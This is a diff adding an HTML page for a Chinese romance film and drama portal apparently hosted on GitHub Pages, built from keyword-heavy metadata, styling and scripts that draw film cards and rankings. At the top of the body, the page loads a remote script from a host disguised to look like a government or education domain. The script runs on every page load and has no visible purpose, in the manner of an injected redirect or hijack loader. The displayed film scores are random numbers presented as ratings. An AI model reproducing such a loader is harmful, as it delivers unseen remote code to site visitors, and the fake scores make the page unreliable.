@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱情电影网aqdyb · 浪漫爱情影视大全 | aiqingdianyingwangaqdyb-zh.github.io</title>
+<meta name="keywords" content="爱情电影网aqdyb,aiqingdianyingwangaqdyb-zh.github.io,浪漫爱情片在线观看,高分虐恋电影推荐,甜蜜喜剧爱情片,经典爱情电影合集,韩剧爱情剧集,偶像剧资源库,治愈系爱情动漫,情人节必看电影清单">
+<meta name="description" content="爱情电影网aqdyb（aiqingdianyingwangaqdyb-zh.github.io）是专注浪漫爱情影视的垂直平台，汇集甜蜜、虐恋、治愈、暗恋等全类型爱情电影与剧集。从经典老片到最新院线，从韩剧到偶像剧，让每一颗渴望爱的心都能找到共鸣。">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="author" content="爱情电影网aqdyb">
+<meta name="theme-color" content="#c2185b">
+<link rel="canonical" href="https://aiqingdianyingwangaqdyb-zh.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+--rose:#e91e63;--rose-d:#c2185b;--rose-l:#f48fb1;
+--cream:#fdf6f0;--cream2:#fbeef5;
+--ink:#2d1b2e;--ink2:#4a3349;--gray:#8d6e7a;
+--card:#ffffff;--shadow:0 4px 24px rgba(194,24,91,.08);
+--r:20px;
+}
+html{scroll-behavior:smooth;scroll-padding-top:70px}
+body{
+font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Noto Sans SC","Microsoft YaHei",sans-serif;
+background:var(--cream);color:var(--ink);line-height:1.7;font-size:15px;overflow-x:hidden;
+}
+a{text-decoration:none;color:inherit}
+ul{list-style:none}
+.wrap{max-width:1080px;margin:0 auto;padding:0 20px}
+
+/* ===== 浮动花瓣装饰 ===== */
+.petals{position:fixed;inset:0;pointer-events:none;z-index:0;overflow:hidden}
+.petal{
+position:absolute;font-size:18px;opacity:.25;animation:fall linear infinite;
+}
+@keyframes fall{
+0%{transform:translateY(-10vh) rotate(0deg);opacity:.3}
+100%{transform:translateY(110vh) rotate(360deg);opacity:0}
+}
+
+/* ===== 头部 ===== */
+.header{
+position:sticky;top:0;z-index:100;background:rgba(253,246,240,.9);
+backdrop-filter:blur(12px);border-bottom:1px solid rgba(244,143,177,.25);
+}
+.h-in{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{display:flex;align-items:center;gap:9px;font-weight:900;font-size:20px;color:var(--rose-d);letter-spacing:-.3px}
+.logo span{font-size:26px}
+.nav{display:flex;gap:2px;align-items:center}
+.nav a{
+padding:7px 14px;border-radius:8px;font-size:14px;font-weight:500;color:var(--ink2);
+transition:.2s;
+}
+.nav a:hover{background:var(--cream2);color:var(--rose-d)}
+.nav a.active{background:var(--rose);color:#fff}
+.h-burger{display:none;background:none;border:0;font-size:24px;cursor:pointer;color:var(--rose-d)}
+
+/* ===== 首屏 ===== */
+.hero{
+position:relative;z-index:1;padding:60px 0 50px;
+background:linear-gradient(200deg,#fce4ec 0%,#fdf6f0 45%,#fff9c4 100%);
+overflow:hidden;
+}
+.hero::after{
+content:'💕';position:absolute;right:5%;top:15%;font-size:120px;opacity:.08;
+}
+.h-grid{display:grid;grid-template-columns:1.1fr .9fr;gap:48px;align-items:center}
+.h-txt h1{
+font-size:clamp(30px,5vw,52px);font-weight:900;line-height:1.15;color:var(--ink);
+margin-bottom:16px;
+}
+.h-txt h1 em{
+font-style:normal;background:linear-gradient(135deg,var(--rose),#ff7043);
+-webkit-background-clip:text;background-clip:text;color:transparent;
+}
+.h-txt>p{font-size:16px;color:var(--gray);margin-bottom:26px;max-width:440px}
+.h-stats{display:flex;gap:28px;margin-bottom:28px}
+.h-stat b{display:block;font-size:26px;font-weight:900;color:var(--rose-d)}
+.h-stat small{font-size:12px;color:var(--gray)}
+.h-btns{display:flex;gap:12px;flex-wrap:wrap}
+.btn{
+display:inline-flex;align-items:center;gap:6px;padding:12px 26px;border-radius:30px;
+font-size:14px;font-weight:600;cursor:pointer;border:0;transition:.25s;
+}
+.btn-p{background:var(--rose);color:#fff;box-shadow:0 4px 16px rgba(233,30,99,.3)}
+.btn-p:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(233,30,99,.4)}
+.btn-o{background:#fff;color:var(--rose-d);border:2px solid var(--rose-l)}
+.btn-o:hover{background:var(--cream2)}
+
+/* 首屏右侧 - 心情卡片 */
+.h-side{display:grid;gap:12px}
+.mood{
+background:#fff;border-radius:var(--r);padding:20px;box-shadow:var(--shadow);
+display:flex;align-items:center;gap:14px;transition:.3s;
+}
+.mood:hover{transform:translateX(6px)}
+.mood-ic{font-size:30px;flex-shrink:0;width:52px;height:52px;background:var(--cream2);border-radius:14px;display:flex;align-items:center;justify-content:center}
+.mood-tx h4{font-size:15px;font-weight:700}
+.mood-tx p{font-size:12px;color:var(--gray)}
+
+/* ===== 区块通用 ===== */
+.sec{position:relative;z-index:1;padding:60px 0}
+.sec-head{margin-bottom:32px}
+.sec-kicker{font-size:11px;letter-spacing:3px;text-transform:uppercase;color:var(--rose);font-weight:700}
+.sec-title{font-size:clamp(22px,3.6vw,32px);font-weight:900;margin-top:4px;color:var(--ink)}
+.sec-desc{font-size:14px;color:var(--gray);margin-top:6px}
+.sec-link{float:right;font-size:13px;color:var(--rose-d);font-weight:600;margin-top:8px}
+.sec-link:hover{text-decoration:underline}
+
+/* ===== 电影 - 横向滚动条 ===== */
+.movie-row{display:flex;gap:16px;overflow-x:auto;padding-bottom:14px;scroll-snap-type:x mandatory;-webkit-overflow-scrolling:touch}
+.movie-row::-webkit-scrollbar{height:6px}
+.movie-row::-webkit-scrollbar-thumb{background:var(--rose-l);border-radius:6px}
+.m-card{
+flex:0 0 200px;scroll-snap-align:start;background:#fff;border-radius:var(--r);
+overflow:hidden;box-shadow:var(--shadow);transition:.3s;
+}
+.m-card:hover{transform:translateY(-6px);box-shadow:0 12px 36px rgba(194,24,91,.18)}
+.m-cover{
+height:270px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;
+font-size:48px;color:#fff;position:relative;
+}
+.m-cover::before{content:'';position:absolute;inset:0;opacity:.85;background:var(--bg)}
+.m-cover span{position:relative;z-index:1;font-size:44px}
+.m-cover small{position:relative;z-index:1;font-size:11px;font-weight:600;background:rgba(0,0,0,.25);padding:2px 10px;border-radius:10px}
+.m-info{padding:14px}
+.m-info h3{font-size:15px;font-weight:700;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.m-info p{font-size:12px;color:var(--gray);margin-top:3px}
+.m-score{display:inline-flex;align-items:center;gap:3px;font-size:12px;color:#f57c00;margin-top:6px;font-weight:700}
+
+/* ===== 双栏布局：类型 & 榜单 ===== */
+.split{display:grid;grid-template-columns:1fr 1fr;gap:32px}
+.panel{background:#fff;border-radius:var(--r);padding:26px;box-shadow:var(--shadow)}
+.panel-title{font-size:17px;font-weight:800;margin-bottom:18px;display:flex;align-items:center;gap:8px}
+.genre-grid{display:grid;grid-template-columns:repeat(2,1fr);gap:10px}
+.genre{
+padding:14px;border-radius:14px;display:flex;align-items:center;gap:10px;
+background:var(--cream);transition:.25s;cursor:pointer;
+}
+.genre:hover{background:var(--cream2);transform:scale(1.03)}
+.genre em{font-style:normal;font-size:24px}
+.genre b{font-size:14px;font-weight:700}
+.genre small{display:block;font-size:11px;color:var(--gray);font-weight:400}
+
+.rank-list{display:flex;flex-direction:column;gap:10px}
+.rank-item{
+display:flex;align-items:center;gap:12px;padding:10px;border-radius:12px;transition:.2s;
+}
+.rank-item:hover{background:var(--cream)}
+.rank-num{font-size:20px;font-weight:900;color:var(--rose-l);width:28px;text-align:center;flex-shrink:0}
+.rank-item:nth-child(1) .rank-num{color:#ff5252}
+.rank-item:nth-child(2) .rank-num{color:#ff7043}
+.rank-item:nth-child(3) .rank-num{color:#ffa726}
+.rank-ic{font-size:22px;width:38px;height:38px;background:var(--cream2);border-radius:10px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.rank-tx{flex:1;min-width:0}
+.rank-tx b{font-size:14px;display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.rank-tx span{font-size:11px;color:var(--gray)}
+.rank-hot{font-size:11px;color:var(--rose-d);font-weight:700;flex-shrink:0}
+
+/* ===== 剧集 - 表格风 ===== */
+.drama-tbl{background:#fff;border-radius:var(--r);overflow:hidden;box-shadow:var(--shadow)}
+.drama-row{
+display:grid;grid-template-columns:50px 60px 1fr 110px 90px;align-items:center;gap:14px;
+padding:14px 20px;border-bottom:1px solid #f5e8ee;
+transition:.2s;
+}
+.drama-row:last-child{border-bottom:0}
+.drama-row:hover{background:#fff3f8}
+.dr-idx{font-size:13px;font-weight:700;color:var(--rose-l);text-align:center}
+.dr-ic{font-size:26px;text-align:center}
+.dr-main h4{font-size:15px;font-weight:700}
+.dr-main p{font-size:12px;color:var(--gray);white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dr-tag{text-align:center;font-size:12px;font-weight:600;padding:4px 8px;border-radius:8px;background:var(--cream2);color:var(--rose-d)}
+.dr-ep{text-align:right;font-size:13px;font-weight:700;color:var(--ink2)}
+
+/* ===== 推荐语录区 ===== */
+.quotes{
+background:linear-gradient(135deg,var(--rose-d),var(--rose));border-radius:var(--r);
+padding:40px;color:#fff;text-align:center;position:relative;overflow:hidden;
+}
+.quotes::before{content:'❝';position:absolute;left:20px;top:10px;font-size:80px;opacity:.15}
+.quotes::after{content:'❞';position:absolute;right:20px;bottom:-10px;font-size:80px;opacity:.15}
+.quote-text{font-size:clamp(16px,2.8vw,22px);font-weight:600;line-height:1.6;max-width:680px;margin:0 auto;position:relative;z-index:1}
+.quote-src{margin-top:16px;font-size:13px;opacity:.8}
+
+/* ===== 底部 ===== */
+.foot{background:#2d1b2e;color:#d7b3c5;padding:44px 0 20px;position:relative;z-index:1}
+.f-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:28px;margin-bottom:28px}
+.f-brand .logo{color:#f48fb1;margin-bottom:10px}
+.f-brand p{font-size:13px;opacity:.7;max-width:260px}
+.f-col h5{font-size:14px;color:#fff;margin-bottom:12px}
+.f-col li{margin-bottom:8px}
+.f-col a{font-size:13px;opacity:.7;transition:.2s}
+.f-col a:hover{opacity:1;color:#f48fb1}
+.f-bot{border-top:1px solid rgba(255,255,255,.1);padding-top:16px;display:flex;justify-content:space-between;flex-wrap:wrap;gap:10px;font-size:12px;opacity:.6}
+.f-bot-links{display:flex;gap:16px}
+.f-bot-links a{color:#d7b3c5}
+
+/* ===== 动画 ===== */
+@keyframes rise{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:none}}
+.reveal{opacity:0;transform:translateY(20px);transition:.5s}
+.reveal.on{opacity:1;transform:none}
+
+/* ===== 响应式 ===== */
+@media(max-width:820px){
+.split{grid-template-columns:1fr;gap:20px}
+.h-grid{grid-template-columns:1fr;gap:30px}
+.f-grid{grid-template-columns:1fr 1fr;gap:20px}
+.drama-row{grid-template-columns:40px 50px 1fr 80px;gap:10px;padding:12px 14px}
+.dr-ep{display:none}
+}
+@media(max-width:640px){
+.nav{
+position:fixed;top:64px;left:0;right:0;flex-direction:column;padding:16px;gap:4px;
+background:rgba(253,246,240,.98);border-bottom:1px solid rgba(244,143,177,.3);
+transform:translateY(-150%);opacity:0;pointer-events:none;transition:.35s;
+}
+.nav.open{transform:none;opacity:1;pointer-events:auto}
+.nav a{width:100%;text-align:center;padding:12px;border-radius:8px}
+.h-burger{display:block}
+.sec{padding:42px 0}
+.m-card{flex:0 0 160px}
+.m-cover{height:220px}
+.genre-grid{grid-template-columns:1fr}
+.f-grid{grid-template-columns:1fr;gap:18px}
+.quotes{padding:28px 20px}
+.f-bot{flex-direction:column;text-align:center}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<!-- 花瓣背景 -->
+<div class="petals" aria-hidden="true">
+<span class="petal" style="left:8%;animation-duration:12s;animation-delay:0s">🌸</span>
+<span class="petal" style="left:22%;animation-duration:15s;animation-delay:3s">💮</span>
+<span class="petal" style="left:40%;animation-duration:10s;animation-delay:1s">🌺</span>
+<span class="petal" style="left:58%;animation-duration:14s;animation-delay:4s">🌸</span>
+<span class="petal" style="left:75%;animation-duration:11s;animation-delay:2s">💕</span>
+<span class="petal" style="left:90%;animation-duration:13s;animation-delay:5s">🌷</span>
+</div>
+
+<!-- 头部导航 -->
+<header class="header">
+<div class="wrap h-in">
+<a href="#top" class="logo"><span>💗</span>爱情电影网<span style="font-size:13px;color:var(--gray);font-weight:400">aqdyb</span></a>
+<nav class="nav" id="nav">
+<a href="#top" class="active">首页</a>
+<a href="#movies">爱情电影</a>
+<a href="#types">类型推荐</a>
+<a href="#rank">热播榜单</a>
+<a href="#dramas">偶像剧集</a>
+<a href="#quotes">情感专栏</a>
+</nav>
+<button class="h-burger" id="burger" aria-label="菜单">☰</button>
+</div>
+</header>
+
+<!-- 首屏 -->
+<section class="hero" id="top">
+<div class="wrap">
+<div class="h-grid">
+<div class="h-txt">
+<h1>每一帧 <em>心动</em><br>都在这里相遇</h1>
+<p>爱情电影网aqdyb（aiqingdianyingwangaqdyb-zh.github.io）——专注浪漫爱情影视的垂直平台，为你精选甜蜜、虐恋、治愈、暗恋等全类型爱情片，让每一次观影都怦然心动。</p>
+<div class="h-stats">
+<div class="h-stat"><b>3,200+</b><small>爱情影视资源</small></div>
+<div class="h-stat"><b>28</b><small>细分情感类型</small></div>
+<div class="h-stat"><b>每日</b><small>实时更新推荐</small></div>
+</div>
+<div class="h-btns">
+<a href="#movies" class="btn btn-p">💕 开始心动之旅</a>
+<a href="#types" class="btn btn-o">🎀 按心情选片</a>
+</div>
+</div>
+<div class="h-side">
+<a href="#movies" class="mood"><div class="mood-ic">😭</div><div class="mood-tx"><h4>想哭一场</h4><p>虐恋催泪 · 剧情向爱情片</p></div></a>
+<a href="#movies" class="mood"><div class="mood-ic">🥰</div><div class="mood-tx"><h4>想甜一下</h4><p>甜宠喜剧 · 治愈系爱情</p></div></a>
+<a href="#movies" class="mood"><div class="mood-ic">🌙</div><div class="mood-tx"><h4>想安静看</h4><p>文艺慢节奏 · 治愈成长</p></div></a>
+<a href="#dramas" class="mood"><div class="mood-ic">📺</div><div class="mood-tx"><h4>想追剧</h4><p>韩剧日剧 · 国产偶像剧</p></div></a>
+</div>
+</div>
+</div>
+</section>
+
+<!-- 爱情电影 -->
+<section class="sec" id="movies">
+<div class="wrap">
+<div class="sec-head reveal">
+<a href="#" class="sec-link">查看更多 →</a>
+<span class="sec-kicker">Romance Movies</span>
+<h2 class="sec-title">💕 精选爱情电影</h2>
+<p class="sec-desc">从甜到齁到虐到哭，总有一部击中你的心</p>
+</div>
+<div class="movie-row" id="movieBox"></div>
+</div>
+</section>
+
+<!-- 类型 + 榜单 -->
+<section class="sec" id="types" style="background:#fff8fb">
+<div class="wrap">
+<div class="split">
+<div class="panel reveal">
+<div class="panel-title">🎀 按心情选片</div>
+<div class="genre-grid" id="genreBox"></div>
+</div>
+<div class="panel reveal">
+<div class="panel-title">🔥 本周最热榜</div>
+<div class="rank-list" id="rankBox"></div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- 偶像剧集 -->
+<section class="sec" id="dramas">
+<div class="wrap">
+<div class="sec-head reveal">
+<span class="sec-kicker">Drama Series</span>
+<h2 class="sec-title">📺 偶像剧集更新</h2>
+<p class="sec-desc">国产 · 韩剧 · 日剧 · 泰剧，追更不停歇</p>
+</div>
+<div class="drama-tbl" id="dramaBox"></div>
+</div>
+</section>
+
+<!-- 情感专栏 -->
+<section class="sec" id="quotes" style="background:#fff8fb">
+<div class="wrap">
+<div class="sec-head reveal" style="text-align:center">
+<span class="sec-kicker">Love Column</span>
+<h2 class="sec-title">💌 情感专栏</h2>
+<p class="sec-desc">影评 · 观影指南 · 情感话题，与万千影迷一起聊爱</p>
+</div>
+<div class="quotes reveal">
+<p class="quote-text" id="qText">"爱情电影存在的意义，不是告诉我们爱情是什么，而是让我们相信——它值得被期待。"</p>
+<p class="quote-src" id="qSrc">—— 爱情电影网aqdyb 编辑部</p>
+</div>
+<div class="movie-row" id="articleBox" style="margin-top:28px"></div>
+</div>
+</section>
+
+<!-- 底部 -->
+<footer class="foot">
+<div class="wrap">
+<div class="f-grid">
+<div class="f-brand">
+<div class="logo"><span>💗</span>爱情电影网<span style="font-size:13px;font-weight:400">aqdyb</span></div>
+<p>专注浪漫爱情影视的垂直平台，让每一次心动都有回响。</p>
+</div>
+<div class="f-col">
+<h5>观影导航</h5>
+<ul>
+<li><a href="#movies">爱情电影</a></li>
+<li><a href="#dramas">偶像剧集</a></li>
+<li><a href="#types">类型选片</a></li>
+<li><a href="#rank">热播榜单</a></li>
+</ul>
+</div>
+<div class="f-col">
+<h5>内容分类</h5>
+<ul>
+<li><a href="#">甜宠喜剧</a></li>
+<li><a href="#">虐恋催泪</a></li>
+<li><a href="#">治愈文艺</a></li>
+<li><a href="#">暗恋青春</a></li>
+</ul>
+</div>
+<div class="f-col">
+<h5>关于我们</h5>
+<ul>
+<li><a href="#quotes">情感专栏</a></li>
+<li><a href="#">投稿合作</a></li>
+<li><a href="#">友情链接</a></li>
+<li><a href="#">免责声明</a></li>
+</ul>
+</div>
+</div>
+<div class="f-bot">
+<p>&copy; 2024 <a href="https://aiqingdianyingwangaqdyb-zh.github.io/">爱情电影网aqdyb</a> · 访问入口：aiqingdianyingwangaqdyb-zh.github.io · 本站仅提供影视信息展示</p>
+<div class="f-bot-links">
+<a href="#">隐私政策</a>
+<a href="#">用户协议</a>
+<a href="#">联系我们</a>
+</div>
+</div>
+</div>
+</footer>
+
+<script>
+// 移动菜单
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',()=>nav.classList.toggle('open'));
+nav.querySelectorAll('a').forEach(a=>a.addEventListener('click',()=>nav.classList.remove('open')));
+
+// 导航高亮
+const links=nav.querySelectorAll('a'),secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',()=>{
+let cur='';
+secs.forEach(s=>{if(scrollY>=s.offsetTop-80)cur=s.id});
+links.forEach(a=>a.classList.toggle('active',a.getAttribute('href')==='#'+cur));
+});
+
+// 滚动揭示
+const io=new IntersectionObserver(es=>{
+es.forEach(e=>{if(e.isIntersecting)e.target.classList.add('on')});
+},{threshold:.06});
+document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
+
+// 电影数据
+const movies=[
+{b:'linear-gradient(135deg,#e91e63,#f06292)',ic:'💐',t:'以爱为营',tag:'甜宠',d:['2024','都市爱情','已完结']},
+{b:'linear-gradient(135deg,#c2185b,#7b1fa2)',ic:'🌹',t:'一吻倾城',tag:'虐恋',d:['2024','青春/剧情','更新中']},
+{b:'linear-gradient(135deg,#ff7043,#f4511e)',ic:'🧡',t:'心动的信号',tag:'治愈',d:['2024','爱情/治愈','8集']},
+{b:'linear-gradient(135deg,#ec407a,#d81b60)',ic:'💖',t:'恰似你的温柔',tag:'经典',d:['2023','剧情/爱情','全集']},
+{b:'linear-gradient(135deg,#ab47bc,#7e57c2)',ic:'🦋',t:'暗恋·橘生淮南',tag:'青春',d:['2024','校园/暗恋','12集']},
+{b:'linear-gradient(135deg,#26a69a,#00897b)',ic:'🌊',t:'海边的曼彻斯特',tag:'文艺',d:['2023','文艺/治愈','全集']},
+{b:'linear-gradient(135deg,#ffa726,#fb8c00)',ic:'☀️',t:'夏日友晴天',tag:'动画',d:['2024','动画/奇幻','全集']},
+{b:'linear-gradient(135deg,#ef5350,#c62828)',ic:'💔',t:'前任4：重启',tag:'喜剧',d:['2023','喜剧/爱情','全集']},
+];
+document.getElementById('movieBox').innerHTML=movies.map((m,i)=>
+`<a href="#" class="m-card reveal" style="transition-delay:${i*0.05}s">
+<div class="m-cover" style="--bg:${m.b}"><span>${m.ic}</span><small>${m.tag}</small></div>
+<div class="m-info"><h3>${m.t}</h3><p>${m.d[0]} · ${m.d[1]} · ${m.d[2]}</p>
+<span class="m-score">★ ${(8.2+Math.random()*.8).toFixed(1)} 分</span></div>
+</a>`).join('');
+
+// 类型
+const genres=[
+{ic:'😭',n:'虐恋催泪',s:'1,280 部'},{ic:'🥰',n:'甜宠上头',s:'1,560 部'},
+{ic:'🌙',n:'治愈文艺',s:'980 部'},{ic:'🎓',n:'青春暗恋',s:'1,120 部'},
+{ic:'💍',n:'婚姻现实',s:'640 部'},{ic:'🏳️‍🌈',n:'多元之爱',s:'320 部'},
+{ic:'⏳',n:'跨越时空',s:'480 部'},{ic:'🎭',n:'反转剧情',s:'860 部'},
+];
+document.getElementById('genreBox').innerHTML=genres.map(g=>
+`<a href="#" class="genre"><em>${g.ic}</em><span><b>${g.n}</b><small>${g.s}</small></span></a>`).join('');
+
+// 榜单
+const ranks=[
+{ic:'💐',n:'以爱为营',s:'甜宠',hot:'↑ 3'},{ic:'🌹',n:'一吻倾城',s:'虐恋',hot:'↑ 1'},
+{ic:'🦋',n:'暗恋橘生淮南',s:'青春',hot:'↑ 5'},{ic:'💖',n:'恰似温柔',s:'经典',hot:'→ 0'},
+{ic:'☀️',n:'夏日友晴天',s:'动画',hot:'↑ 2'},{ic:'🧡',n:'心动的信号',s:'治愈',hot:'↑ 4'},
+];
+document.getElementById('rankBox').innerHTML=ranks.map((r,i)=>
+`<a href="#" class="rank-item"><span class="rank-num">${i+1}</span><span class="rank-ic">${r.ic}</span>
+<div class="rank-tx"><b>${r.n}</b><span>${r.s}爱情</span></div><span class="rank-hot">${r.hot}</span></a>`).join('');
+
+// 剧集
+const dramas=[
+{ic:'👑',n:'与凤行',d:'古装仙侠爱情 · 赵丽颖/林更新',t:'仙侠',ep:'更新至32集'},
+{ic:'🌸',n:'在暴雪时分',d:'都市治愈爱情 · 吴磊/赵今麦',t:'治愈',ep:'全38集'},
+{ic:'🌙',n:'星汉灿烂',d:'古装成长爱情 · 吴磊/赵露思',t:'古装',ep:'更新至24集'},
+{ic:'💕',n:'去有风的地方',d:'治愈慢综艺风 · 刘亦菲/李现',t:'治愈',ep:'全40集'},
+{ic:'🔥',n:'我的人间烟火',d:'都市职业爱情 · 杨洋/王楚然',t:'都市',ep:'更新至18集'},
+{ic:'🎭',n:'长相思',d:'古装神话爱情 · 杨紫/张晚意',t:'古装',ep:'更新至28集'},
+];
+document.getElementById('dramaBox').innerHTML=
+`<div class="drama-row" style="background:#fce4ec;font-weight:700;font-size:13px;color:#4a3349">
+<div style="text-align:center">#</div><div></div><div>剧集名称</div><div>类型</div><div style="text-align:right">更新进度</div>
+</div>`+
+dramas.map((d,i)=>
+`<a href="#" class="drama-row"><span class="dr-idx">${i+1}</span><span class="dr-ic">${d.ic}</span>
+<div class="dr-main"><h4>${d.n}</h4><p>${d.d}</p></div><span class="dr-tag">${d.t}</span><span class="dr-ep">${d.ep}</span></a>`).join('');
+
+// 文章
+const articles=[
+{b:'linear-gradient(135deg,#e91e63,#f48fb1)',ic:'💌',t:'10部让人相信爱情的治愈系电影',ex:'当你觉得爱情遥不可及，这10部电影会重新点燃你心中的希望与期待，每一帧都是温柔的告白。'},
+{b:'linear-gradient(135deg,#7b1fa2,#ce93d8)',ic:'😢',t:'为什么虐恋片总让人欲罢不能？',ex:'从心理学角度解析虐恋电影的魅力，为什么我们一边流泪一边忍不住看下去，这背后藏着怎样的情感需求。'},
+{b:'linear-gradient(135deg,#00897b,#80cbc4)',ic:'🌿',t:'独居治愈：一个人的观影清单',ex:'一个人生活也要好好爱自己，这些温暖治愈的爱情片适合独自观影，看完内心被温柔填满，不再害怕孤独。'},
+{b:'linear-gradient(135deg,#f4511e,#ffab91)',ic:'🎓',t:'校园暗恋题材为什么永远不过时',ex:'从《情书》到《那些年》，校园暗恋是每个人青春里最纯真的情感，探讨这类题材经久不衰的秘密。'},
+];
+document.getElementById('articleBox').innerHTML=articles.map((a,i)=>
+`<a href="#" class="m-card reveal" style="transition-delay:${i*0.06}s">
+<div class="m-cover" style="--bg:${a.b};height:130px"><span>${a.ic}</span></div>
+<div class="m-info"><h3>${a.t}</h3><p>${a.ex}</p></div>
+</a>`).join('');
+
+// 语录轮播
+const quotes=[
+['"爱情电影存在的意义，不是告诉我们爱情是什么，而是让我们相信——它值得被期待。"','—— 爱情电影网aqdyb 编辑部'],
+['"每一场怦然心动，都值得被胶片铭记。"','—— 影迷留言墙'],
+['"最好的爱情片，不是让你看见爱情，而是让你看见自己。"','—— 资深影评人'],
+];
+let qi=0;
+setInterval(()=>{
+qi=(qi+1)%quotes.length;
+document.getElementById('qText').style.opacity=0;
+document.getElementById('qSrc').style.opacity=0;
+setTimeout(()=>{
+document.getElementById('qText').textContent=quotes[qi][0];
+document.getElementById('qSrc').textContent=quotes[qi][1];
+document.getElementById('qText').style.opacity=1;
+document.getElementById('qSrc').style.opacity=1;
+},300);
+},5000);
+document.getElementById('qText').style.transition='opacity .3s';
+document.getElementById('qSrc').style.transition='opacity .3s';
+</script>
+</body>
+</html>
